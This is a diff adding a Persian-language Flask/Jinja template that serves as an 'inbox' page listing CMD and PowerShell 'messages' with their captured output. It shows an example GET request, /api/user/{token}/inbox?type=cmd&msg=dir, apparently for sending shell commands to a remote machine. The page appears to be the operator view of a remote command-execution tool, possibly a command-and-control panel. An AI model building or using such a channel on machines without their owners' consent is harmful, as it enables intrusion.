@@ -1,0 +1,53 @@
+<!-- templates/inbox.html -->
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>تاریخچه پیام‌ها</title>
+  <style>
+    body { font-family: Tahoma; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+    .container { max-width: 900px; margin: auto; }
+    .msg { padding: 12px; margin: 8px 0; background: #2d2d2d; border-radius: 6px; }
+    .cmd { border-right: 4px solid #4CAF50; }
+    .ps { border-right: 4px solid #2196F3; }
+    .label { font-weight: bold; margin-left: 8px; }
+    .time { font-size: 0.8em; color: #888; float: left; }
+    .refresh { margin: 20px 0; text-align: center; }
+    button { padding: 10px 20px; background: #007acc; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background: #005a99; }
+    .info { margin-top: 8px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>تاریخچه پیام‌های دریافتی</h1>
+    <div class="refresh">
+      <button onclick="location.reload()">به‌روزرسانی</button>
+    </div>
+    <div id="messages">
+      {% if messages %}
+        {% for msg in messages %}
+            <div class="msg {{ 'cmd' if msg.type == 'cmd' else 'ps' }}">
+                <span class="label">[{{ msg.type.upper() }}]</span>
+                <span class="text">{{ msg.msg }}</span>
+
+                {% if msg.info %}
+                  <details class="info">
+                    <summary>نمایش خروجی ({{ msg.info|length }} کاراکتر)</summary>
+                    <pre style="background:#1e1e1e; padding:10px; border-radius:4px; max-height:300px; overflow:auto;">{{ msg.info }}</pre>
+                  </details>
+                {% else %}
+                  <p class="info"><em>در حال اجرا...</em></p>
+                {% endif %}
+            </div>
+        {% endfor %}
+      {% else %}
+        <p>پیامی وجود ندارد.</p>
+      {% endif %}
+    </div>
+    <hr>
+    <p><small>ارسال پیام:</small></p>
+    <code>/api/user/{{ token }}/inbox?type=cmd&msg=dir</code>
+  </div>
+</body>
+</html>
